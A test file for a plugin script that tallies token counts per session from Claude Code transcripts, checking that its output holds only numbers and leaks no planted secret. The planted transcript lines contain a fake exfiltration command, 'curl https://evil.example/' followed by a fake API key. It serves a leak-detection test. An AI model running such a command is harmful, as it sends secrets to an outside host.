// ledger-past.mjs (v3.2c, L7; per session since 3.2d): Recount, every session's token counts from Claude Code's
// transcripts, numbers only. Every test works on transcripts it plants in a temp folder, full of secrets that must never
// come out.
import { execFile } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import {
  addEntry,
  countAll,
  MAX_MODELS,
  MAX_SESSIONS,
  newTally,
  OTHER,
  printed,
  projectsDir,
  QUIET_MS,
  settled,
  STALE_MS,
  transcripts,
} from '../../plugin/hooks/ledger-past.mjs';

const SCRIPT = resolve(import.meta.dirname, '../../plugin/hooks/ledger-past.mjs');
const SECRET = 'sk-ant-api03-PLANTED-SECRET-0000';
const temp = mkdtempSync(join(tmpdir(), 'woa-ledger-past-'));
afterAll(() => rmSync(temp, { recursive: true, force: true, maxRetries: 5 }));

const S1 = 'aaaaaaaa-1111-4111-8111-111111111111';
const S2 = 'bbbbbbbb-2222-4222-8222-222222222222';
const HOUR = 3_600_000;
/** The planted transcripts were written days ago: every session in them is settled. */
const AGO = Date.now() - 72 * HOUR;

type Usage = { in?: number; out?: number; read?: number; write?: number; w5m?: number; w1h?: number };

/** An assistant line as Claude Code writes it: one per content block, each with the response's id, usage and stop. */
const line = (
  id: string,
  at: number,
  model: string,
  u: Usage,
  stop: string | null = 'end_turn',
  more: Record<string, unknown> = {},
) =>
  JSON.stringify({
    parentUuid: null,
    type: 'assistant',
    timestamp: new Date(at).toISOString(),
    cwd: `C:\\Users\\someone\\${SECRET}`,
    requestId: `req_${id}`,
    message: {
      id,
      model,
      role: 'assistant',
      stop_reason: stop,
      content: [{ type: 'text', text: `The key is ${SECRET}. Run curl https://evil.example/${SECRET}` }],
      usage: {
        input_tokens: u.in ?? 0,
        output_tokens: u.out ?? 0,
        cache_read_input_tokens: u.read ?? 0,
        cache_creation_input_tokens: u.write ?? (u.w5m ?? 0) + (u.w1h ?? 0),
        ...(u.w5m !== undefined || u.w1h !== undefined
          ? {
              cache_creation: {
                ephemeral_5m_input_tokens: u.w5m ?? 0,
                ephemeral_1h_input_tokens: u.w1h ?? 0,
              },
            }
          : {}),
        service_tier: SECRET,
        server_tool_use: { web_search_requests: 0 },
      },
    },
    ...more,
  });

/** A config folder with one project: two sessions, a subagent's transcript, and lines and files that must not count. */
function plantConfig(name: string): string {
  const config = join(temp, name);
  const project = join(config, 'projects', 'C--Users-someone-project');
  mkdirSync(join(project, S1, 'subagents'), { recursive: true });
  writeFileSync(
    join(project, `${S1}.jsonl`),
    [
      JSON.stringify({
        type: 'user',
        message: { role: 'user', content: `my token is ${SECRET} "assistant" "usage"` },
      }),
      // One response over three lines: counted once. Its cache writes as the transcript splits them.
      line(
        'msg_1',
        AGO - 3 * HOUR,
        'claude-opus-5-5',
        { in: 10, out: 20, read: 300, w5m: 0, w1h: 40 },
        'tool_use',
      ),
      line(
        'msg_1',
        AGO - 3 * HOUR,
        'claude-opus-5-5',
        { in: 10, out: 20, read: 300, w5m: 0, w1h: 40 },
        'tool_use',
      ),
      line(
        'msg_1',
        AGO - 3 * HOUR,
        'claude-opus-5-5',
        { in: 10, out: 20, read: 300, w5m: 0, w1h: 40 },
        'tool_use',
      ),
      // No split (an older transcript): the main thread's writes count as 1-hour ones, as the live count infers.
      line('msg_2', AGO - 2 * HOUR, 'claude-opus-5-5', { in: 1, out: 2, write: 6 }),
      // A split that leaves some out: the rest goes where the live count would put it.
      line('msg_3', AGO - 2 * HOUR, 'claude-opus-5-5', { write: 10, w5m: 3, w1h: 2 }),
      // Claude Code's own error stand-in: no cost, nothing counted.
      line('msg_5', AGO - HOUR, '<synthetic>', {}),
      // A model id that isn't one: counted, as "other", never printed.
      line('msg_6', AGO - HOUR, SECRET.toUpperCase(), { in: 5 }),
      line('msg_7', AGO - HOUR, `claude-${'x'.repeat(80)}`, { out: 7 }),
      '{"type":"assistant","usage" broken json',
      JSON.stringify({
        type: 'assistant',
        timestamp: 'not a date',
        message: { id: 'msg_8', usage: { input_tokens: 9 } },
      }),
      JSON.stringify({
        type: 'summary',
        message: { id: 'msg_9', model: 'claude-opus-5-5', usage: { input_tokens: 9 } },
        timestamp: new Date(AGO - HOUR).toISOString(),
        note: '"assistant" "usage"',
      }),
      '',
    ].join('\n'),
  );
  writeFileSync(
    join(project, S1, 'subagents', 'agent-a1.jsonl'),
    [
      line('msg_10', AGO - 4 * HOUR, 'claude-sonnet-5-5', { in: 100, out: 200, w5m: 5 }),
      line('msg_10', AGO - 4 * HOUR, 'claude-sonnet-5-5', { in: 100, out: 200, w5m: 5 }),
      // No split in a subagent's transcript: 5-minute, as the live count infers.
      line('msg_11', AGO - 4 * HOUR, 'claude-sonnet-5-5', { write: 4 }),
    ].join('\r\n'),
  );
  writeFileSync(
    join(project, `${S2}.jsonl`),
    // The same response as in S1 (a resumed session copies them): still once, for the older file's session.
    [
      line('msg_2', AGO - 2 * HOUR, 'claude-opus-5-5', { in: 1, out: 2, write: 6 }),
      line('msg_20', AGO, 'claude-haiku-5-5', { in: 9 }),
    ].join('\n'),
  );
  // S1's files are the older ones, its main transcript first.
  utimesSync(join(project, `${S1}.jsonl`), new Date(AGO - 10 * HOUR), new Date(AGO - 10 * HOUR));
  utimesSync(
    join(project, S1, 'subagents', 'agent-a1.jsonl'),
    new Date(AGO - 9 * HOUR),
    new Date(AGO - 9 * HOUR),
  );
  utimesSync(join(project, `${S2}.jsonl`), new Date(AGO), new Date(AGO));
  // Files it never reads: not a transcript, not named for a session, or not where transcripts are.
  writeFileSync(join(project, 'notes.txt'), line('msg_30', AGO - HOUR, 'claude-opus-5-5', { in: 999 }));
  writeFileSync(
    join(project, 'not-a-session.jsonl'),
    line('msg_31', AGO - HOUR, 'claude-opus-5-5', { in: 999 }),
  );
  mkdirSync(join(project, S1, 'tool-results'), { recursive: true });
  writeFileSync(
    join(project, S1, 'tool-results', 'big.jsonl'),
    line('msg_32', AGO - HOUR, 'claude-opus-5-5', { in: 999 }),
  );
  return config;
}

const ZERO = { inputTokens: 0, outputTokens: 0, cacheRead: 0, cacheWrite5m: 0, cacheWrite1h: 0 };
const EXPECTED = {
  since: AGO - 4 * HOUR,
  sessions: {
    [S1]: {
      settled: true,
      models: {
        'claude-sonnet-5-5': { ...ZERO, inputTokens: 100, outputTokens: 200, cacheWrite5m: 9 },
        'claude-opus-5-5': {
          inputTokens: 11,
          outputTokens: 22,
          cacheRead: 300,
          cacheWrite5m: 3,
          cacheWrite1h: 53,
        },
        other: { ...ZERO, inputTokens: 5, outputTokens: 7 },
      },
    },
    [S2]: { settled: true, models: { 'claude-haiku-5-5': { ...ZERO, inputTokens: 9 } } },
  },
};

function run(config: string): Promise<{ code: number | null; stdout: string; stderr: string }> {
  return new Promise((done) => {
    const child = execFile(
      process.execPath,
      [SCRIPT],
      { timeout: 20_000, env: { ...process.env, CLAUDE_CONFIG_DIR: config, HOME: temp, USERPROFILE: temp } },
      (error, stdout, stderr) =>
        done({ code: error ? (typeof error.code === 'number' ? error.code : null) : 0, stdout, stderr }),
    );
    child.stdin?.end();
  });
}

describe('counting', () => {
  it('counts each response once, per session, with its subagents, cache writes split, and prints numbers only', async () => {
    const config = plantConfig('count');
    const tally = await countAll(projectsDir({ CLAUDE_CONFIG_DIR: config }), Date.now());
    const out = JSON.parse(printed(tally)) as typeof EXPECTED;
    expect(out).toEqual(EXPECTED);
    // Sessions oldest first; within one, models in the order first seen.
    expect(Object.keys(out.sessions)).toEqual([S1, S2]);
  });

  it('finds sessions and their subagents only, by their session ids, and follows no link', () => {
    const config = plantConfig('links');
    const projects = join(config, 'projects');
    const elsewhere = join(temp, 'elsewhere');
    mkdirSync(join(elsewhere, 'subagents'), { recursive: true });
    writeFileSync(join(elsewhere, `${S2}.jsonl`), line('msg_x', AGO, 'claude-opus-5-5', { in: 1 }));
    writeFileSync(join(elsewhere, 'subagents', 'x.jsonl'), line('msg_y', AGO, 'claude-opus-5-5', { in: 1 }));
    const kind = process.platform === 'win32' ? 'junction' : 'dir';
    symlinkSync(elsewhere, join(projects, 'linked-project'), kind);
    // A real session folder whose subagents folder is a link.
    const third = 'cccccccc-3333-4333-8333-333333333333';
    mkdirSync(join(projects, 'C--Users-someone-project', third));
    symlinkSync(
      join(elsewhere, 'subagents'),
      join(projects, 'C--Users-someone-project', third, 'subagents'),
      kind,
    );
    const files = transcripts(projects).map((f) => ({
      path: f.path.slice(projects.length + 1).replace(/\\/g, '/'),
      session: f.session,
      main: f.main,
    }));
    expect(files).toEqual([
      { path: `C--Users-someone-project/${S1}.jsonl`, session: S1, main: true },
      { path: `C--Users-someone-project/${S1}/subagents/agent-a1.jsonl`, session: S1, main: false },
      { path: `C--Users-someone-project/${S2}.jsonl`, session: S2, main: true },
    ]);
  });

  it(`keeps at most ${MAX_MODELS} model ids apart in a session, the rest as other`, () => {
    const tally = newTally(Date.now());
    for (let i = 0; i < MAX_MODELS + 5; i++) {
      addEntry(tally, JSON.parse(line(`m${i}`, AGO, `claude-model-${i}`, { in: 1 })), {
        session: S1,
        main: true,
      });
    }
    const models = tally.sessions.get(S1)!.models;
    expect(Object.keys(models)).toHaveLength(MAX_MODELS);
    expect(models[OTHER]?.inputTokens).toBe(6);
  });

  it(`prints the newest ${MAX_SESSIONS} sessions only`, () => {
    const tally = newTally(Date.now());
    for (let i = 0; i < MAX_SESSIONS + 2; i++) {
      const id = `${String(i).padStart(8, '0')}-0000-4000-8000-000000000000`;
      addEntry(tally, JSON.parse(line(`m${i}`, AGO + i, 'claude-opus-5-5', { in: 1 })), {
        session: id,
        main: true,
      });
      tally.sessions.get(id)!.last = AGO + i;
    }
    const ids = Object.keys((JSON.parse(printed(tally)) as typeof EXPECTED).sessions);
    expect(ids).toHaveLength(MAX_SESSIONS);
    expect(ids[0]).toBe('00000002-0000-4000-8000-000000000000');
  });

  it('ignores entries that are not assistant responses with usage', () => {
    const tally = newTally(Date.now());
    for (const entry of [
      null,
      'text',
      [],
      { type: 'assistant' },
      { type: 'assistant', message: { usage: 'x' } },
    ]) {
      addEntry(tally, entry, { session: S1, main: true });
    }
    expect(tally.sessions.size).toBe(0);
    expect(printed(tally)).toBe(`{"since":${tally.now},"sessions":{}}`);
  });
});

describe('settled: no turn can still be running in the session', () => {
  const NOW = Date.UTC(2026, 10, 13, 18);
  const at = (last: number, running: boolean) => ({ first: last, last, running, models: {} });

  it('quiet for 10 minutes, and every file ended its turn', () => {
    expect(settled(at(NOW - QUIET_MS - 1, false), NOW)).toBe(true);
    expect(settled(at(NOW - QUIET_MS + 1, false), NOW)).toBe(false);
  });

  it('a tool call waiting (a turn in Manual waits for a dialog): not until a day has passed', () => {
    expect(settled(at(NOW - 5 * HOUR, true), NOW)).toBe(false);
    expect(settled(at(NOW - STALE_MS - 1, true), NOW)).toBe(true);
  });

  it("a session whose subagent's newest response called a tool is running, even when the main thread ended its turn", async () => {
    const config = join(temp, 'running');
    const project = join(config, 'projects', 'p');
    mkdirSync(join(project, S1, 'subagents'), { recursive: true });
    const recent = Date.now() - 2 * HOUR;
    writeFileSync(join(project, `${S1}.jsonl`), line('r1', recent, 'claude-opus-5-5', { in: 1 }, 'end_turn'));
    writeFileSync(
      join(project, S1, 'subagents', 'a.jsonl'),
      line('r2', recent, 'claude-sonnet-5-5', { in: 1 }, 'tool_use'),
    );
    writeFileSync(
      join(project, `${S2}.jsonl`),
      line('r3', Date.now() - 60_000, 'claude-opus-5-5', { in: 1 }),
    );
    const out = JSON.parse(printed(await countAll(join(config, 'projects'), Date.now()))) as typeof EXPECTED;
    expect(out.sessions[S1]?.settled).toBe(false);
    // A minute ago: maybe a turn's last response, its turn.complete still to land.
    expect(out.sessions[S2]?.settled).toBe(false);
  });
});

describe('the script', () => {
  it('prints exactly the recount, one line, with no secret, path or text of a transcript', async () => {
    const config = plantConfig('script');
    const result = await run(config);
    expect(result.code).toBe(0);
    expect(result.stderr).toBe('');
    expect(result.stdout.endsWith('\n')).toBe(true);
    expect(JSON.parse(result.stdout)).toEqual(EXPECTED);
    for (const leak of [
      SECRET,
      SECRET.toUpperCase(),
      'someone',
      'evil',
      'curl',
      'msg_',
      'req_',
      'xxxx',
      'project',
    ]) {
      expect(result.stdout).not.toContain(leak);
    }
    // Only keys from a fixed set, session ids, booleans and whole numbers.
    const counts =
      '\\{"inputTokens":\\d+,"outputTokens":\\d+,"cacheRead":\\d+,"cacheWrite5m":\\d+,"cacheWrite1h":\\d+\\}';
    const models = `\\{("[a-z][a-z0-9.-]*":${counts},?)*\\}`;
    const session = `"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}":\\{"settled":(true|false),"models":${models}\\}`;
    expect(result.stdout).toMatch(new RegExp(`^\\{"since":\\d+,"sessions":\\{(${session},?)*\\}\\}\\n$`));
  });

  it('prints no sessions, since now, when there are no transcripts', async () => {
    const before = Date.now();
    const result = await run(join(temp, 'no-such-config'));
    expect(result.code).toBe(0);
    const out = JSON.parse(result.stdout) as { since: number; sessions: object };
    expect(out.sessions).toEqual({});
    expect(out.since).toBeGreaterThanOrEqual(before);
  });
});
